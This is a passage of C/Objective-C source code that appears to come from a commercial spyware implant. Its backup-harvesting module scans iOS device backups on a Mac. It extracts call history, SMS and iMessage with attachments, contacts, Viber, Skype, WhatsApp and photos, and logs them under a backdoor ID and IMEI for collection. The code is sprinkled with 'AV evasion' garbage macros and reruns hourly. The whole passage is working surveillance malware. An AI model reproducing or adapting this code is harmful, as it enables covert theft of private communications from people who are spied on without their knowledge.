        rec->flags = (dir%2 == 1)? 0:1;
        // program
        rec->program = 0x00000000; // phone call
        // enqueue
        rec->next = recordsHead;
        recordsHead = rec;
        
    }
    
    // free sqlite resources
    sqlite3_finalize(stmt);
    
    // close db
    sqlite3_close(db);
    
    // log
    logCall(recordsHead);
    
    // free allocated mem
    deleteCallRecordList(recordsHead);
    
    return 1;
}

int collectCallHistory(mbdbRecord *head, long epochMarkup)
{
    if (head == NULL)
    {
        return -1;
    }
    
    mbdbRecord *current = head;
    while (current!=NULL)
    {
        if (strend(current->filename,"call_history.db"))
        {
#ifdef DEBUG_BKUPS
            infoLog(@"found call_history db\n");
            infoLog(@"filename: %s\n",current->sha1);
#endif
            parseCallDb(current->sha1, epochMarkup);
            return 1;
        }
        current = current->next;
    }
    return -1;
}

int parseMessagesDb(mbdbRecord *head, char *dbName, long epochMarkup)
{
    if (dbName == NULL)
    {
        return -1;
    }
    
    chatRecord *msgsHead = NULL;
    
    sqlite3 *db = NULL;
    sqlite3_stmt *stmt = NULL;
    char query[1024];
    long date = epochMarkup;
    char _query[] = "select message.ROWID, message.date, message.text, message.is_from_me, message.handle_id, attachment.filename, attachment.mime_type, attachment.transfer_name, message.date_read from message left outer join message_attachment_join on message.ROWID = message_attachment_join.message_id left outer join attachment on message_attachment_join.attachment_id = attachment.ROWID where message.service = 'iMessage' and message.date > ";
    
    // open db
    if (sqlite3_open(dbName, &db))
    {
        sqlite3_close(db);
        return -1;
    }
    
    // construct query
    // timestamp in db is in mac absolute time
    if ((date -= TimeIntervalSince1970) <0 )
    {
        date = 1;
    }
    
    sprintf(query, "%s %ld", _query, date);
    
    if(sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK)
    {
        sqlite3_close(db);
        return -1;
    }
    
    while(sqlite3_step(stmt) == SQLITE_ROW)
    {
        chatRecord *msg = calloc(1,sizeof(chatRecord));
        if (msg == NULL)
        {
            continue;
        }
        attachRecord att;
        memset(&att,0,sizeof(attachRecord));
        
        // msgId
        int msgId = sqlite3_column_int(stmt,0);
        // handleId
        int msgHandleId = sqlite3_column_int(stmt,4);
        // msg date - mac absolute time
        msg->epochTime = sqlite3_column_double(stmt,8);
        if (msg->epochTime == 0)
        {
            msg->epochTime = sqlite3_column_double(stmt,1);
        }
        msg->epochTime += TimeIntervalSince1970;
        // msg flag, 1 incoming, 0 outgoing
        int fromMe = sqlite3_column_int(stmt,3);
        msg->flags = (fromMe == 1)? 0 : 1;
        // chat type
        msg->type = MESSAGES_CHAT;
        // chat text
        char *text = (char *)sqlite3_column_text(stmt,2);
        if(text!=NULL)
        {
            if ((msg->text = calloc(strlen(text)+1,sizeof(char)))!=NULL)
            {
                strcpy(msg->text,text);
            }
        }
        if (fromMe == 1)
        {
            // outging msg
            // sender is me
            if((msg->from = calloc(strlen("target")+1,sizeof(char)))!=NULL) // me, local
                strcpy(msg->from,"target"); // me, local
            
            // peer is me and chat participants
            if ((msg->to = calloc(strlen("target")+1,sizeof(char)))!=NULL) // me, local
            {
                strcpy(msg->to,"target"); // me, local
            }
            sqlite3_stmt *stmt2 = NULL;
            char query2[1024];
            char _query2[] = "select handle.id from handle where handle.ROWID IN (select chat_handle_join.handle_id from chat_handle_join where chat_id = (select chat_id from chat_message_join where chat_message_join.message_id = ";
            sprintf(query2, "%s %d ))", _query2, msgId);
            
            if(sqlite3_prepare_v2(db, query2, -1, &stmt2, NULL) != SQLITE_OK)
            {
                freeChatRecord(msg);
                continue;
            }
            while(sqlite3_step(stmt2) == SQLITE_ROW)
            {
                char *handleId = (char *)sqlite3_column_text(stmt2,0);
                
                if (handleId != NULL)
                {
                    if (msg->to == NULL)
                    {
                        // first contact
                        if ((msg->to = calloc(strlen(handleId)+1,sizeof(char)))!=NULL)
                        {
                            strcpy(msg->to,handleId);
                        }
                    }
                    else
                    {
                        // all subsequent contacts
                        char *new = realloc(msg->to,sizeof(char)*(strlen(msg->to)+strlen(handleId)+strlen(","))+1);
                        if (new != NULL)
                        {
                            msg->to = new;
                            strcat(msg->to, ",");
                            strcat(msg->to,handleId);
                        }
                    }
                }
            }
            sqlite3_finalize(stmt2);
        }
        else
        {
            // incoming msg
            // sender is handle.id in handle
            sqlite3_stmt *stmt3 = NULL;
            char query3[256];
            char _query3[] = "select handle.id from handle where handle.ROWID = ";
            sprintf(query3, "%s %d", _query3, msgHandleId);
            if(sqlite3_prepare_v2(db, query3, -1, &stmt3, NULL) == SQLITE_OK)
            {
                while(sqlite3_step(stmt3) == SQLITE_ROW)
                {
                    char *handleId = (char *)sqlite3_column_text(stmt3,0);
                    if (handleId != NULL)
                    {
                        if ((msg->from = malloc(sizeof(char)*strlen(handleId)+1)) != NULL)
                        {
                            strcpy(msg->from,handleId);
                        }
                    }
                }
            }
            sqlite3_finalize(stmt3);
            
            
            // peers are me and participants in chat
            if ((msg->to = calloc(strlen("target")+1,sizeof(char)))!=NULL) // me, local
            {
                strcpy(msg->to,"target"); // me, local
            }
            sqlite3_stmt *stmt4 = NULL;
            char query4[1024];
            char _query4[] = "select handle.id from handle where handle.ROWID IN (select chat_handle_join.handle_id from chat_handle_join where chat_id = (select chat_id from chat_message_join where chat_message_join.message_id = ";
            sprintf(query4, "%s %d ))", _query4, msgId);
            if(sqlite3_prepare_v2(db, query4, -1, &stmt4, NULL) == SQLITE_OK)
            {
                while(sqlite3_step(stmt4) == SQLITE_ROW)
                {
                    char *handleId = (char *)sqlite3_column_text(stmt4,0);
                    
                    if (handleId != NULL)
                    {
                        if (msg->to == NULL)
                        {
                            // first run
                            if ((msg->to = calloc(strlen(handleId)+1,sizeof(char)))!=NULL)
                            {
                                strcpy(msg->to,handleId);
                            }
                        }
                        else
                        {
                            char *new = realloc(msg->to,sizeof(char)*(strlen(msg->to)+strlen(handleId)+strlen(","))+1);
                            if (new != NULL)
                            {
                                msg->to = new;
                                strcat(msg->to, ",");
                                strcat(msg->to,handleId);
                            }
                        }
                    }
                }
            }
            sqlite3_finalize(stmt4);
        }
        
        // enqueue
        msg->next = msgsHead;
        msgsHead = msg;
        
        char *attachFilename = (char *)sqlite3_column_text(stmt,5);
        
        if (attachFilename != NULL)
        {
            // there's an attachment
            mbdbRecord *current = head;
            while (current!=NULL)
            {
                // usually attach filename in device db starts with ~/,
                // that ~/, in backup db, is stripped out
                // this is the reason we check current->filename against attachFilename
                if (strend(attachFilename,current->filename))
                {
                    att.to = msg->to;
                    att.from = msg->from;
                    att.filename = current->sha1;
                    att.mimeType = (char *)sqlite3_column_text(stmt,6);
                    att.transferName = (char *)sqlite3_column_text(stmt,7);
                    att.flags = msg->flags;
                    att.type = msg->type;
                    att.epochTime = msg->epochTime;
                    
                    break;
                }
                current = current->next;
            }
            // log attach, we don't want empty logs
            if(att.filename != NULL)
            {
                logAttach(&att);
            }
        }
    }
    
    // free sqlite resources
    sqlite3_finalize(stmt);
    
    // close db
    sqlite3_close(db);
    
    // log
    logChat(msgsHead);
    
    // free allocated mem
    deleteChatRecordList(msgsHead);
    
    return 1;
}

int collectMessages(mbdbRecord *head, long epochMarkup)
{
    if (head == NULL)
    {
        return -1;
    }
    
    mbdbRecord *current = head;
    while (current!=NULL)
    {
        if (strend(current->filename,"sms.db"))
        {
#ifdef DEBUG_BKUPS
            infoLog(@"found messages db\n");
            infoLog(@"filename: %s\n",current->sha1);
#endif
            parseMessagesDb(head,current->sha1, epochMarkup);
            return 1;
        }
        current = current->next;
    }
    return -1;
}


int parseContactsDb(char *dbName, long epochMarkup)
{
    if (dbName == NULL)
    {
        return -1;
    }
    sqlite3 *db = NULL;
    sqlite3_stmt *stmt = NULL;
    char query[512];
    long date = epochMarkup;
    // GROUP_CONCAT puts all values together, they are separated by ","
    // remember to tokenize them when creating logs
    char _query[] = "select ROWID, first, last, (select GROUP_CONCAT(value) from ABMultiValue where property = 3 and record_id = ABPerson.ROWID ), (select GROUP_CONCAT(value) from ABMultiValue where property = 4 and record_id = ABPerson.ROWID ) from ABPerson where ModificationDate > ";
    
    // open db
    if (sqlite3_open(dbName, &db))
    {
        sqlite3_close(db);
        return -1;
    }
    
    // construct query
    if ((date -= TimeIntervalSince1970) < 0 )  // tmestamp in db is in mac absolute time
    {
        date = 1;
    }
    sprintf(query, "%s %ld", _query, date);
    
    if(sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK)
    {
        sqlite3_close(db);
        return -1;
    }
    
    while(sqlite3_step(stmt) == SQLITE_ROW)
    {
        contactRecord rec;
        memset(&rec,0,sizeof(contactRecord));
        
        // first
        rec.firstName = (char *)sqlite3_column_text(stmt,1);
        // last
        rec.lastName = (char *)sqlite3_column_text(stmt,2);
        // mobile
        rec.mobile = (char *)sqlite3_column_text(stmt,3);
        // email
        rec.email = (char *)sqlite3_column_text(stmt,4);
        // program
        rec.program = 0x11;  // contact from addressbook
        
        // log
        logContacts(&rec);
    }
    
    // free sqlite resources
    sqlite3_finalize(stmt);
    
    // Close as soon as possible
    sqlite3_close(db);
    
    return 1;
}


int collectContacts(mbdbRecord *head, long epochMarkup)
{
    if (head == NULL)
    {
        return -1;
    }
    
    mbdbRecord *current = head;
    while (current!=NULL)
    {
        if (strend(current->filename,"AddressBook.sqlitedb"))
        {
#ifdef DEBUG_BKUPS
            infoLog(@"found contacts db\n");
            infoLog(@"filename: %s\n",current->sha1); 
#endif
            parseContactsDb(current->sha1, epochMarkup);
            return 1;
        }
        current = current->next;
    }
    return -1;
}


void logSyncStartEnd(int type)
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSDate *nowDate = [NSDate date];
    NSTimeInterval nowInterval = [nowDate timeIntervalSince1970];
    NSNumber *timeNumber = [NSNumber numberWithLong:nowInterval];
    
    SBJsonWriter *writer = [[SBJsonWriter alloc] init];
    
    // additional header
    NSMutableData *additionalHeader = [[NSMutableData alloc] initWithCapacity:0];
    uint32_t version = 2015040801;
    [additionalHeader appendBytes:&version length:sizeof(uint32_t)];
    NSMutableDictionary *dictHeader = [NSMutableDictionary dictionary];
    [dictHeader setObject:@"ios" forKey:@"platform"];
    NSString *bIdString = [NSString stringWithUTF8String:gBackdoorID];
    [dictHeader setObject:bIdString forKey:@"ident"];
    NSString *imeiString = [NSString stringWithUTF8String:imei];
    [dictHeader setObject:imeiString forKey:@"instance"];
    if(type == SYNCTYPE_START)
    {
#ifdef DEBUG_BKUPS
        infoLog(@"proxy log start");
#endif
        [dictHeader setObject:@"sync_start" forKey:@"type"];
    }
    else
    {
#ifdef DEBUG_BKUPS
        infoLog(@"proxy log end");
#endif
        [dictHeader setObject:@"sync_stop" forKey:@"type"];
    }
    NSString *jsonHeaderString = [writer stringWithObject:dictHeader];
    [additionalHeader appendData:[jsonHeaderString dataUsingEncoding:NSUTF8StringEncoding]];
    
    // content
    NSMutableData *logData = [[NSMutableData alloc] initWithCapacity:0];
    NSMutableDictionary *dictData = [NSMutableDictionary dictionary];
    NSString *nameString = [NSString stringWithUTF8String:phoneName];
    [dictData setObject:nameString forKey:@"name"];
    [dictData setObject:timeNumber forKey:@"time"];
    NSString *jsonDataString = [writer stringWithObject:dictData];
    [logData appendData:[jsonDataString dataUsingEncoding:NSUTF8StringEncoding]];
  
    // log
    __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
    
    BOOL success = [logManager createLog: LOGTYPE_PROXY_EV
                             agentHeader: additionalHeader
                               withLogID: 0];
    
    if (success)
    {
        [logManager writeDataToLog: logData
                          forAgent: LOGTYPE_PROXY_EV
                         withLogID: 0];
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        [logManager closeActiveLog: LOGTYPE_PROXY_EV
                         withLogID: 0];
        
        // AV evasion: only on release build
        AV_GARBAGE_004
    }
    
    // clean
    [writer release];
    [logData release];
    [additionalHeader release];
    [pool release];
    
}


static __m_MAgentBkups *sharedAgentBkups = nil;

@interface __m_MAgentBkups (private)


- (void) _getBkupsTimer:(NSTimer *)timer;
- (BOOL) _getBkups;
- (void) _getMarkup;
- (void) _setMarkup;

@end

@implementation __m_MAgentBkups (private)

- (void) _getMarkup
{
    markup = [[__m_MUtils sharedInstance] getPropertyWithName:[[self class] description]];
    if(markup==nil)
    {
        // markup not found, we allocate it
        markup = [NSMutableDictionary dictionaryWithCapacity: 1];
    }
}

- (void) _setMarkup
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    [[__m_MUtils sharedInstance] setPropertyWithName:[[self class] description]withDictionary:markup];
    
    [pool release];
}


- (void) _getBkupsTimer: (NSTimer *)timer
{
    [self _getBkups];
}

- (BOOL) _getBkups
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_000

    // retrieve all bckup dirs
    char **bkpDirs = getBackupDirs();
    
    if (bkpDirs == NULL)
    {
        return NO;
    }
    
    // retrieve markup, a date in epoch time
    long epochMarkup = 1;
    NSNumber *date = [markup objectForKey:MARKUP_KEY];
    if(date != nil)
    {
        epochMarkup = [date longValue];
    }
    
    // calculate new markup in epoch time
    NSDate *dateNow = [NSDate date];
    NSTimeInterval intervalNow = [dateNow timeIntervalSince1970];
    NSNumber *nowNumber = [NSNumber numberWithLong:intervalNow];
    
    // collect data from every bkup dir
    int i =0;
    while (*(bkpDirs+i) != NULL)
    {
        //
        // parse Info.plist file into current bkpDir and put relevant info
        // into global vars
        if(parseInfoFile(*(bkpDirs+i)) <0 )
        {
#ifdef DEBUG_BKUPS
            infoLog(@"Error in parse info file");
#endif
            continue;
        }

        // check if agent has been stopped
        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
        {
            freeBkupArray(bkpDirs);
            [pool release];
            return YES;
        }
        
        //
        // parse Manifest.mbdb file into current bkpDir and put relevant info
        // into a list of mbdb records
        mbdbRecord *head = NULL;
        if(parseMbdbFile(&head,*(bkpDirs+i)) < 0)
        {
#ifdef DEBUG_BKUPS
            infoLog(@"Error in parse mbdb file");
#endif
            continue;
        }
        
        // check if agent has been stopped
        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
        {
            deleteMbdbRecordList(head);
            freeBkupArray(bkpDirs);
            [pool release];
            return YES;
        }
        
        // log sync start
        logSyncStartEnd(SYNCTYPE_START);
        
        // collect sms
        collectSms(head, epochMarkup);
        // check if agent has been stopped
        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
        {
            deleteMbdbRecordList(head);
            freeBkupArray(bkpDirs);
            [pool release];
            return YES;
        }
        
        // collect call_history
        collectCallHistory(head,epochMarkup);
        // check if agent has been stopped
        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
        {
            deleteMbdbRecordList(head);
            freeBkupArray(bkpDirs);
            [pool release];
            return YES;
        }
        
        // collect contacts
        collectContacts(head,epochMarkup);
        // check if agent has been stopped
        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
        {
            deleteMbdbRecordList(head);
            freeBkupArray(bkpDirs);
            [pool release];
            return YES;
        }
        
        // collect viber
        collectViber(head,epochMarkup);
        // check if agent has been stopped
        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
        {
            deleteMbdbRecordList(head);
            freeBkupArray(bkpDirs);
            [pool release];
            return YES;
        }
        
        // collect skype
        collectSkype(head,epochMarkup);
        // check if agent has been stopped
        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
        {
            deleteMbdbRecordList(head);
            freeBkupArray(bkpDirs);
            [pool release];
            return YES;
        }
        
        // collect whatsapp
        collectWhatsApp(head,epochMarkup);
        // check if agent has been stopped
        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
        {
            deleteMbdbRecordList(head);
            freeBkupArray(bkpDirs);
            [pool release];
            return YES;
        }
        
        // collect iMessage
        collectMessages(head, epochMarkup);
        // check if agent has been stopped
        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
        {
            deleteMbdbRecordList(head);
            freeBkupArray(bkpDirs);
            [pool release];
            return YES;
        }
        
        // collect pictures
        collectPhotos(head,epochMarkup);
        // check if agent has been stopped
        if([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP]
           || [[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOPPED])
        {
            deleteMbdbRecordList(head);
            freeBkupArray(bkpDirs);
            [pool release];
            return YES;
        }
        
        // log sync end
        logSyncStartEnd(SYNCTYPE_STOP);
        
        // free record list
        deleteMbdbRecordList(head);
        
        ++i;
    }
    
    // free bkup dir array
    freeBkupArray(bkpDirs);
    
    // set new markup
    [markup setObject: nowNumber forKey:MARKUP_KEY];
    
    [pool release];
    return YES;
}

@end


@implementation __m_MAgentBkups

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentBkups *)sharedInstance
{
    @synchronized(self)
    {
        if (sharedAgentBkups == nil)
        {
            //
            // Assignment is not done here
            //
            [[self alloc] init];
        }
    }
    
    return sharedAgentBkups;
}

+ (id)allocWithZone: (NSZone *)aZone
{
    @synchronized(self)
    {
        if (sharedAgentBkups == nil)
        {
            sharedAgentBkups = [super allocWithZone: aZone];
            
            //
            // Assignment and return on first allocation
            //
            return sharedAgentBkups;
        }
    }
    
    // On subsequent allocation attemps return nil
    return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
    return self;
}

- (unsigned)retainCount
{
    // Denotes an object that cannot be released
    return UINT_MAX;
}

- (id)retain
{
    return self;
}

- (void)release
{
    // Do nothing
}

- (id)autorelease
{
    return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -


- (BOOL)stop
{
#ifdef DEBUG_BKUPS
    infoLog(@"module stopped");
#endif
    
    int internalCounter = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [mConfiguration setObject: AGENT_STOP
                       forKey: @"status"];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    while (![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED]
           && internalCounter <= MAX_STOP_WAIT_TIME)
    {
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        internalCounter++;
        usleep(100000);
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    return YES;
}

- (void)start
{
    NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
    
#ifdef DEBUG_BKUPS
    infoLog(@"module started");
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [mConfiguration setObject: AGENT_RUNNING forKey: @"status"];
    
    [self _getMarkup];
    
    //first run
    [self _getBkups];
    
    NSRunLoop *currentRunLoop = [NSRunLoop currentRunLoop];
    
    // TODO: change timer interval
    NSTimer *timer = nil;
    timer = [NSTimer scheduledTimerWithTimeInterval: 3600 target:self selector:@selector(_getBkupsTimer:) userInfo:nil repeats:YES];
    [currentRunLoop addTimer: timer forMode: NSRunLoopCommonModes];
    
    while (![[mConfiguration objectForKey: @"status"] isEqual: AGENT_STOP]
           && ![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED])
    {
        NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        if (gOSMajor == 10 && gOSMinor >= 6)
            [currentRunLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
        else
            sleep(1);
        
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        [inner release];
    }
    
    if (timer != nil)
    {
        [timer invalidate];
    }
    
    if ([[mConfiguration objectForKey: @"status"] isEqualToString: AGENT_STOP])
    {
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        [mConfiguration setObject: AGENT_STOPPED
                           forKey: @"status"];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [outerPool release];
}


- (BOOL)resume
{
#ifdef DEBUG_BKUPS
    infoLog(@"module resumed");
#endif
    
    return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    return mConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    if (aConfiguration != mConfiguration)
    {
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        [mConfiguration release];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        mConfiguration = [aConfiguration retain];
    }
}

@end
